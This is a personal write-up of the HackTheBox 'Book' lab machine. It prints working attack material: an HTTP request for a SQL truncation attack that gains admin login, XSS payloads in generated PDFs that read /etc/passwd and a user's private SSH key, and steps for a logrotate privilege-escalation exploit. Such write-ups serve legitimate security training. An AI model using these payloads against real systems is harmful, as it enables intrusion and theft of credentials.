---
layout: single
title: 'Book Write-Up: HackTheBox'
excerpt: "Book was a medium machine on Hack The Box created by MrR3boot. Initial recon revealed a web application login that is vulnerable to SQL truncation attack, allowing login as `admin`. Once `admin`, we can inject XSS payloads to read local files through dynamically generated PDFs, which is used to extract a user's private SSH key. Finally, logged in as the user `reader` via SSH, a vulnerable version of `logrotate` running as root is discovered, which is exploited to escalate to the root user."
classes: wide
categories: [hackthebox]
date: 2020-07-11
tags: [hackthebox, xxs, sqli, hacking, penetration testing, write-ups]
header:
  teaser: \assets\images\htb\book\book-banner.png
  teaser_home_page: true
toc: false
toc_label: "Table of Contents"
toc_icon: "database"  # corresponding Font Awesome icon name (without fa prefix)
# toc_sticky: true
---
![](\assets\images\htb\book\book-banner.png)
## TL;DR
Book was a *medium* machine on Hack The Box created by MrR3boot. Initial recon revealed a web application whose user registration is vulnerable to a SQL truncation attack, leading to login as `admin`. Once `admin`, we can inject XSS payloads to read local files through dynamically generated PDFs, which is used to extract a user's private SSH key. Finally, logged in as the user `reader` via SSH, a vulnerable version of `logrotate` running as root is discovered, which is exploited to escalate to root.

## Nmap Port Scan
`nmap -sCV -Pn -n -p- -T4 -oN nmap/full-book 10.10.10.176`

Nmap revealed two open ports. OpenSSH on port 22 and Apache on port 80.
![](\assets\images\htb\book\book-nmap.png)

## Web Application Enumeration

Rustbuster doesn't reveal anything immediately interesting. Lots of redirections!
![](\assets\images\htb\book\book-rustbuster.png)

Taking a look at the web app through the browser we are greeted with a login prompt and the option to **Sign Up**.
![](\assets\images\htb\book\book-login.png)

I created a test account and logged in.
![](\assets\images\htb\book\book-signup.png)

Once signed in we see various functionality but nothing that immediately stuck out as vulnerable.
![](\assets\images\htb\book\book-test-signin.png)

Viewing my profile information, I noticed an interesting behavior. The "t" was missing off of my username. 
![](\assets\images\htb\book\book-test-profile.png)

I inspected the source and found JS with some validation occuring.
```javascript
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
```

Exploring further, the authentication mechanism is vulnerable to a SQL truncation attack. This means I can create a user with all the attributes of the `admin` account and add a bit of padding to exceed the character limit and a random character. This user will be accepted but when the user is inserted into the database, it is truncated to the column limit. In this case, `name` and `email` have a character limit of 10 and 20 respectively. Additionally, I had to change the role parameter (see below). After performing this attack, this allows me to login as the admin user.
```
POST /index.php HTTP/1.1
Host: 10.10.10.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.176/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Connection: close
Cookie: PHPSESSID=cchd42rqq7qeqb0aoueen81nl9
Upgrade-Insecure-Requests: 1

name=admin+++++a&email=admin@book.htb++++++a&password=password&role=administrator
```
REF: [MySQL and SQL Column Truncation Vulnerabilities](https://www.suspekt.org/mysql-and-sql-column-truncation-vulnerabilities/){:target="_blank"} 

Successfully logged in as `admin`, we get an Admin Panel with various functionality. Immediately interesting was the "Collections" area that revealed a couple of PDF files.
![](\assets\images\htb\book\book-admin-panel.png)

## XSS via PDF
I discovered that the application has server side processing of PDFs, which we control the input to via *Book Submission* area. Exploitation of this mechanism is documented here:
- [Local File Read via XSS in Dynamically Generated PDF ](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html){:target="_blank"} 
- [PayloadsAllTheThings/Upload Insecure Files/Extension PDF JS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PDF%20JS){:target="_blank"}

In the spirit of payloading all the things, I payloaded the Title, Author, and the uploaded PDF file.
![](\assets\images\htb\book\book-library-payload.png)

The payload with result to retrieve `/etc/passwd`:
```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```
![](\assets\images\htb\book\book-etc-passwd.png)

After learning of the `reader` user. The payload with result to retrieve `/home/reader/.ssh/id_rsa`:
```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```
![](\assets\images\htb\book\book-reader-idrsa.png)

## Breaking Through
I then extracted the private key text from the pdf, fiddled with formatting it properly, and was able to  get a SSH session as the `reader` user. We are in business! I was able to obtain the user flag and start enumerating the machine.
![](\assets\images\htb\book\book-reader-login.png)

I used pSpy and noticed an interesting item. Logrotate was running as root.
![](\assets\images\htb\book\book-pspy.png)

## Exploitation
I learned that the version of `logrotate` is 3.11.0 which is vulnerable to a privilege escalation.
```bash
reader@book:~/backups$ logrotate --version
logrotate 3.11.0
```
With the [logrotten 3.15.1 - Privilege Escalation](https://www.exploit-db.com/exploits/47466){:target="_blank"} all versions of `logrotate` through 3.15.1 are vulnerable to this exploit. 

Checking the preconditions that must exist:
1. Logrotate has to be executed as root. (**Verified**)
2. The logpath needs to be in control of the attacker. (**Verified**)
  + This is in Reader's home directory. `/home/reader/backups/access.log`
3. Any option that creates files is set in the logrotate configuration.
  + This precondition I can not verify because the configuration is stored in the root's home directory, so we might have a bit of guessing.

I transferred the exploit to the Book machine and compiled it locally. 
`gcc -o log logrotten.c`

I set up my bash script to be a simple bash reverse shell.
![](\assets\images\htb\book\book-bash-shell.png)

The exploit gave the option to change the target directory, but I kept it as `/etc/bash_completion.d/`.  I then executed the exploit with our access.log file and executedI `echo "test" > /home/reader/backups/access.log` just to be sure a change to the log occured. Once the exploit was complete, I performed some some random terminal autocompletion.
![](\assets\images\htb\book\book-access-log.png)

## We Are Root!
We got a root shell on the port I was listening on!
![](\assets\images\htb\book\book-set-listener.png)

The logrotate configuration and root flag.
![](\assets\images\htb\book\book-post-logcfg.png)

An interesting look behind the curtain.
![](\assets\images\htb\book\book-post-reset.png)